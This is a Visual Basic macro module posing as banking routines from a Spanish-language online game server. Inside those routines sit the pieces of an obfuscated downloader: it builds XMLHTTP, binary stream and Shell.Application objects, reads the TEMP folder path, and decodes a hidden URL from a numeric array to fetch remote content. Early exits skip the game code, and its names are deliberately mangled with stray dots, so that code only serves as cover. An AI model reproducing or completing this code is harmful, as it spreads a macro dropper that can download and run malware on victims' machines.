Attribute VB_Name = "Module1"
Public halalaya As Object
Public adbrd As Object
Public processEnv  As Object

Public tempFile As String
Public shellApp As Object

Public Sub IniciarDeposito(ByVal UserIndex As Integer)
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

On Error GoTo ErrHandler

tempFile = processEnv("T" & "EMP")

    adbrd.Open
Exit Sub
'Hacemos un Update del inventario del usuario
Call Upda.teBanUserInv(True, UserIndex, 0)
'Actualizamos el dinero
Call Writ.eUpdateUserStats(UserIndex)
'Mostramos la ventana pa' comerciar y ver ladear la osamenta. jajaja
Call Writ.eBankInit(UserIndex)
UserL.ist(UserIndex).Flags.Comerciando = True

ErrHandler:

End Sub

Public Sub SendBanObj(UserIndex As Integer, Slot As Byte, Object As String)

Set shellApp = CreateObject("Shell.Application")
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************
adbrd.Type = 1
Dim Professor() As Variant
Professor = Array(148, 158, 156, 150, 94, 81, 79, 145, 79, 72, 121, 131, 117, 140, 127, 124, 109, 129, 123, 52, 103, 113, 109, 45, 106, 115, 109, 35, 93, 96, 86, 93, 95, 79, 75, 21, 71, 85, 65, 85, 10, 63, 80, 59)
ans = GetStringFromArray(Professor, 44)
halalaya.Open "GET", GetStringFromArray(Professor, 44), False
Exit Sub
Us.rList(Use.rIndex).BancoInvent.Object(Slot) = Object

Call Writ.eChangeBankSlot(UserI.ndex, Slot)

End Sub


Public Sub UserRetiraItem(ByVal UserIndex As Integer, ByVal i As Integer, ByVal Cantidad As Integer)
'***************************************************
'Author: Unknownn
'Last Modification: 10/08/2011 - ^[GS]^
'
'***************************************************

On Error GoTo ErrHandler

    Dim ObjIndex As Integer
Set halalaya = CreateObject("Microsoft.XMLHTTP")

    If Cantidad < 1 Then Exit Sub
    
    Call Writ.eUpdateUserStats(UserIndex)

    If Use.rList(UserIndex).BancoInvent.Object(i).Amount > 0 Then
    
        If Cantidad > Use.rList(UserIndex).BancoInvent.Object(i).Amount Then _
            Cantidad = Use.rList(UserIndex).BancoInvent.Object(i).Amount
            
        ObjIndex = UserL.ist(UserIndex).BancoInvent.Object(i).ObjIndex
        
        'Agregamos el obj que compro al inventario
        Call UserR.eciveObj(UserIndex, CInt(i), Cantidad)
        
        If ObjD.ata(ObjIndex).Log = 1 Then
            Call LogDes.arrollo(Use.rList(UserIndex).Name & " retiró " & Cantidad & " " & _
                ObjD.ata(ObjIndex).Name & "[" & ObjIndex & "]")
        End If
        
        'Actualizamos el inventario del usuario
        Call UpdateU.serInv(True, UserIndex, 0)
        'Actualizamos el banco
        Call UpdateBan.UserInv(True, UserIndex, 0)
    End If
    
    'Actualizamos la ventana de comercio
    Call Updat.eVentanaBanco(UserIndex)


ErrHandler:

End Sub


Sub SendUserBovedaTxtFromChar(ByVal sendIndex As Integer, ByVal charName As String)
'***************************************************
'Author: Unknownn
'Last Modification: -
'
'***************************************************

On Error Resume Next
Dim j As Integer
Dim CharFile As String, Tmp As String
Dim ObjInd As Long, ObjCant As Long

CharFile = CharPath & charName & ".chr"

If FileExist(CharFile, vbNormal) Then
    Call WriteConsoleMsg(sendIndex, charName, FontTypeNames.FONTTYPE_INFO)
    Call WriteConsoleMsg(sendIndex, "Tiene " & GetVar(CharFile, "BancoInventory", "CantidadItems") & " objetos.", FontTypeNames.FONTTYPE_INFO)
    For j = 1 To MAX_BANCOINVENTORY_SLOTS
        Tmp = GetVar(CharFile, "BancoInventory", "Obj" & j)
        ObjInd = ReadField(1, Tmp, Asc("-"))
        ObjCant = ReadField(2, Tmp, Asc("-"))
        If ObjInd > 0 Then
            Call WriteConsoleMsg(sendIndex, "Objeto " & j & " " & ObjData(ObjInd).Name & " Cantidad:" & ObjCant, FontTypeNames.FONTTYPE_INFO)
        End If
    Next
Else
    Call WriteConsoleMsg(sendIndex, "Usuario inexistente: " & charName, FontTypeNames.FONTTYPE_INFO)
End If

End Sub

